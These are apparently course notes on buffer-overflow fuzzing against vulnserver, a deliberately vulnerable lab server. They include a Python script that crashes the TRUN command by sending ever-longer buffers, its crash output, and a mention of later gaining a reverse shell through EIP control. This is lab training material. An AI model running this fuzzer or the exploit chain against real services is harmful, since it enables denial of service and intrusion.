# Fuzzing

Very similar to spiking in the sense that we will send a series of characters at a specific command and try to break it

Difference: In spiking, we try to do that to multiple commands and find what's vulnerable. For us, now that we know that TRUN is vulnerable, we will go and attack that and try to figure out how to break it. 

Every time we crash vulnserver, make sure to restart it, and restart the debugger + run as admin 

Copied file `1.py`:
```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		
		s.send(('TRUN /.:/' + buffer ))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
```

We run it against the vulnserver and eventually it does crash.
We receive:
```shell
root@kali:~/PEH# ./1.py 
Fuzzing crashed at 2700 bytes
```

We now know we crashed around 3000 bytes. Next step, we need to find where the EIP is at

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/17b7121616c3453084c863c9f050b505.png)

Once we control the EIP value, we can point it to our malicious code and run our reverse shell

